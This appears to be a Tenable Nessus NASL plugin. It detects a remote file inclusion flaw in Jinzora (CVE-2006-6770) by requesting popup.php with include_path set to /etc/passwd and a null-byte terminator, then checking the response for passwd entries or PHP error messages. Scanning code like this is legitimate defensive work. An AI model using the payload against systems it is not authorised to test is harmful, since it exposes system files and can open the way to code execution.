#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(23965);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2006-6770");
  script_bugtraq_id(21741);
  script_osvdb_id(31685, 31686, 31687, 31688);
  script_xref(name:"EDB-ID", value:"3003");

  script_name(english:"Jinzora Multiple Script include_path Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file with Jinzora");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple remote file include issues." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Jinzora, a web-based media streaming and
management system written in PHP. 

The installation of Jinzora on the remote host fails to sanitize input
to the 'include_path' parameter of several scripts before using it in
the 'jzBackend.php' script to include PHP code.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit these issues to view arbitrary files or to execute
arbitrary PHP code on the remote host, subject to the privileges of
the web server user id." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");


 script_set_attribute(attribute:"plugin_publication_date", value: "2007/01/02");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/12/26");
 script_cvs_date("$Date: 2011/03/14 21:48:06 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2011 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories (catch CMS installs too).
foreach dir (make_list(cgi_dirs(), "/modules/jinzora"))
{
  file = "/etc/passwd";
  r = http_send_recv3(method:"GET", port: port, 
    item:string(dir, "/popup.php?","include_path=", file, "%00"));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or...
    string("main(", file, "\\0settings.php): failed to open stream") >< res ||
    # we get an error claiming the file doesn't exist or...
    string("main(", file, "): failed to open stream: No such file") >< res ||
    # we get an error about open_basedir restriction.
    string("open_basedir restriction in effect. File(", file) >< res
  )
  {
    contents = NULL;
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<br");

    if (contents)
    {
      report = string(
        "Here are the repeated contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
    }
    else report = NULL;

    security_warning(port:port, extra:report);
    exit(0);
  }
}
